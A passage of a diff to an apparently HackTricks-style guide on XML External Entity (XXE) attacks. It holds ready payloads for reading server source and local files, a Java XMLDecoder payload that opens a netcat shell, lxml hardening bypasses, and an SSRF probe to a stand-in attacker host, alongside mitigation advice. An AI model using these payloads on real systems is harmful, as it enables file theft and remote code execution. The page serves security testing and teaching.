+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>The Blog</title>
+<link>http://example.com/</link>
+<description>A blog about things</description>
+<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>a post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+### Read source code
+
+Using PHP base64 filter
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>The Blog</title>
+<link>http://example.com/</link>
+<description>A blog about things</description>
+<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>a post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+## Java XMLDecoder XEE to RCE
+
+XMLDecoder is a Java class that creates objects based on a XML message. If a malicious user can get an application to use arbitrary data in a call to the method **readObject**, he will instantly gain code execution on the server.
+
+### Using Runtime().exec()
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.7.0_21" class="java.beans.XMLDecoder">
+ <object class="java.lang.Runtime" method="getRuntime">
+      <void method="exec">
+      <array class="java.lang.String" length="6">
+          <void index="0">
+              <string>/usr/bin/nc</string>
+          </void>
+          <void index="1">
+              <string>-l</string>
+          </void>
+          <void index="2">
+              <string>-p</string>
+          </void>
+          <void index="3">
+              <string>9999</string>
+          </void>
+          <void index="4">
+              <string>-e</string>
+          </void>
+          <void index="5">
+              <string>/bin/sh</string>
+          </void>
+      </array>
+      </void>
+ </object>
+</java>
+```
+
+### ProcessBuilder
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.7.0_21" class="java.beans.XMLDecoder">
+  <void class="java.lang.ProcessBuilder">
+    <array class="java.lang.String" length="6">
+      <void index="0">
+        <string>/usr/bin/nc</string>
+      </void>
+      <void index="1">
+         <string>-l</string>
+      </void>
+      <void index="2">
+         <string>-p</string>
+      </void>
+      <void index="3">
+         <string>9999</string>
+      </void>
+      <void index="4">
+         <string>-e</string>
+      </void>
+      <void index="5">
+         <string>/bin/sh</string>
+      </void>
+    </array>
+    <void method="start" id="process">
+    </void>
+  </void>
+</java>
+```
+
+## XXE + WrapWrap + Lightyear + bypasses
+
+Take a look to this amazing report [https://swarm.ptsecurity.com/impossible-xxe-in-php/](https://swarm.ptsecurity.com/impossible-xxe-in-php/)<sup>[[17]](#references)</sup>
+
+## Tools
+
+
+{{#ref}}
+https://github.com/luisfontes19/xxexploiter
+{{#endref}}
+
+### Python lxml Parameter-Entity XXE (Error-Based File Disclosure)
+
+> [!INFO]
+> The Python library **lxml** uses **libxml2** under the hood.  Versions prior to **lxml 5.4.0 / libxml2 2.13.8** still expand *parameter* entities even when `resolve_entities=False`, making them reachable when the application enables `load_dtd=True` and/or `resolve_entities=True`.  This allows Error-Based XXE payloads that embed the contents of local files into the parser error message.<sup>[[10]](#references)[[11]](#references)</sup>
+
+#### 1. Exploiting lxml < 5.4.0
+1. Identify or create a *local* DTD on disk that defines an **undefined** parameter entity (e.g. `%config_hex;`).
+2. Craft an internal DTD that:
+   * Loads the local DTD with `<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">`.
+   * Redefines the undefined entity so that it:
+     - Reads the target file (`<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">`).
+     - Builds another parameter entity that refers to an **invalid path** containing the `%flag;` value and triggers a parser error (`<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">`).
+3. Finally expand `%local_dtd;` and `%eval;` so that the parser encounters `%error;`, fails to open `/aaa/<FLAG>` and leaks the flag inside the thrown exception – which is often returned to the user by the application.
+
+```xml
+<!DOCTYPE colors [
+  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
+  <!ENTITY % config_hex '
+    <!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
+    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
+  %eval;'>
+  %local_dtd;
+]>
+```
+When the application prints the exception the response contains:
+```
+Error : failed to load external entity "file:///aaa/FLAG{secret}"
+```
+
+> [!TIP]
+> If the parser complains about `%`/`&` characters inside the internal subset, double-encode them (`&#x26;#x25;` ⇒ `%`) to delay expansion.
+
+#### 2. Bypassing the lxml 5.4.0 hardening (libxml2 still vulnerable)
+`lxml` ≥ 5.4.0 forbids *error* parameter entities like the one above, but **libxml2** still allows them to be embedded in a *general* entity.  The trick is to:
+1. Read the file into a parameter entity `%file`.
+2. Declare another parameter entity that builds a **general** entity `c` whose SYSTEM identifier uses a *non-existent protocol* such as `meow://%file;`.
+3. Place `&c;` in the XML body.  When the parser tries to dereference `meow://…` it fails and reflects the full URI – including the file contents – in the error message.
+
+```xml
+<!DOCTYPE colors [
+  <!ENTITY % a '
+    <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
+    <!ENTITY % b "<!ENTITY c SYSTEM 'meow://%file;'>">
+  '>
+  %a; %b;
+]>
+<colors>&c;</colors>
+```
+
+#### Key takeaways
+* **Parameter entities** are still expanded by libxml2 even when `resolve_entities` should block XXE.<sup>[[11]](#references)</sup>
+* An **invalid URI** or **non-existent file** is enough to concatenate controlled data into the thrown exception.
+* The technique works **without outbound connectivity**, making it ideal for strictly egress-filtered environments.
+
+#### Mitigation guidance
+* Upgrade to **lxml ≥ 5.4.0** and ensure the underlying **libxml2** is **≥ 2.13.8**.
+* Disable `load_dtd` and/or `resolve_entities` unless absolutely required.
+* Avoid returning raw parser errors to the client.
+
+### Java DocumentBuilderFactory hardening example
+
+Java applications frequently parse XML using `DocumentBuilderFactory`.  By default the factory **allows external entity resolution**, making it vulnerable to XXE and SSRF if no additional hardening flags are set:<sup>[[1]](#references)</sup>
+
+```java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder builder = dbf.newDocumentBuilder(); // XXE-prone
+```
+
+Secure configuration example:
+
+```java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+// Completely forbid any DOCTYPE declarations (best-effort defence)
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+// Disable expansion of external entities
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+// Enable "secure processing" which applies additional limits
+dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);
+
+// Defensive extras
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+
+DocumentBuilder builder = dbf.newDocumentBuilder();
+```
+
+If the application must support DTDs internally, keep `disallow-doctype-decl` disabled but **always** leave the two `external-*-entities` features set to `false`.  The combination prevents classical file-disclosure payloads (`file:///etc/passwd`) as well as network-based SSRF vectors (`http://169.254.169.254/…`, `jar:` protocol, etc.).
+
+Real-world case study: **CVE-2025-27136** in the Java S3 emulator *LocalS3* used the vulnerable constructor shown above.  An unauthenticated attacker could supply a crafted XML body to the `CreateBucketConfiguration` endpoint and have the server embed local files (for example `/etc/passwd`) in the HTTP response.
+
+### XXE in JMF/Print Orchestration Services → SSRF
+
+Some print workflow/orchestration platforms expose a network-facing Job Messaging Format (JMF) listener that accepts XML over TCP. If the underlying parser accepts a `DOCTYPE` and resolves external entities, you can leverage a classical XXE to force the server to make outbound requests (SSRF) or access local resources.<sup>[[12]](#references)</sup>
+
+Key points observed in the wild:<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+- Network listener (e.g., JMF client) on a dedicated port (commonly 4004 in Xerox FreeFlow Core).
+- Java-based XML parsing inside a jar (e.g., `jmfclient.jar`) without `disallow-doctype-decl` or entity resolution disabled.
+- Out-of-band callbacks reliably confirm exploitation.
+
+Minimal JMF-style SSRF probe (structure varies by product but the DOCTYPE is what matters):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE JMF [
+  <!ENTITY probe SYSTEM "http://attacker-collab.example/oob">  
+]>
+<JMF SenderID="hacktricks" Version="1.3" TimeStamp="2025-08-13T10:10:10Z">
+  <Query Type="KnownMessages">&probe;</Query>
+</JMF>
+```
+
+Notes:
+- Replace the entity URL with your collaborator. If SSRF is possible the server will resolve it while parsing the message.
+- Hardenings to look for: `disallow-doctype-decl=true`, `external-general-entities=false`, `external-parameter-entities=false`.
+- Even when the JMF port does not serve files, SSRF can be chained for internal recon or to reach management APIs bound to localhost.
+
+References for this vector are listed at the end of the page.
+
+## References
+
+- [1] [OffSec Blog – CVE-2025-27136 LocalS3 XXE](https://www.offsec.com/blog/cve-2025-27136/)
+- [2] [Black Hat EU 2013 – XML Data (Osipov) slides](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
+- [3] [XXE Cheat Sheet – web-in-security blog](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
+- [4] [From RSS to XXE: Feed Parsing on Hootsuite](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)
+- [5] [PayloadsAllTheThings – XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
+- [6] [staaldraad – XXE cheat sheet gist](https://gist.github.com/staaldraad/01415b990939494879b4)
+- [7] [Exploiting XML External Entity (XXE) Injections – onehackman](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)
+- [8] [PortSwigger Web Security Academy – XXE](https://portswigger.net/web-security/xxe)
+- [9] [GoSecure XXE Workshop](https://gosecure.github.io/xxe-workshop/#7)
+- [10] [Dojo CTF Challenge #42 – Hex Color Palette XXE write-up](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-42)
+- [11] [lxml bug #2107279 – Parameter-entity XXE still possible](https://bugs.launchpad.net/lxml/+bug/2107279)
+- [12] [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core XXE/SSRF + Path Traversal)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
+- [13] [Xerox FreeFlow Core Security Guide (architecture/ports)](https://securitydocs.business.xerox.com/wp-content/uploads/2025/03/Security-Guide-Information-Assurance-Disclosure-Xerox-FreeFlow-Core-8.0.pdf)
+- [14] [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
+- [15] [PHPOffice PhpSpreadsheet advisory - XXE in XLSX parsing](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7)
+- [16] [Local file read via error-based XXE - pwn.vg](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)
+- [17] [Impossible XXE in PHP - PT Swarm](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
+- [18] [medium.com - Googlectf 2019 Web Bnv Writeup Nicholas Rianto Putra Medium](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)
+- [19] [Hakatemia - XXE in Excel and Word Files (OOXML)](https://www.hakatemia.fi/en/courses/xxe/ooxml-xxe)
+
+{{#include ../banners/hacktricks-training.md}}
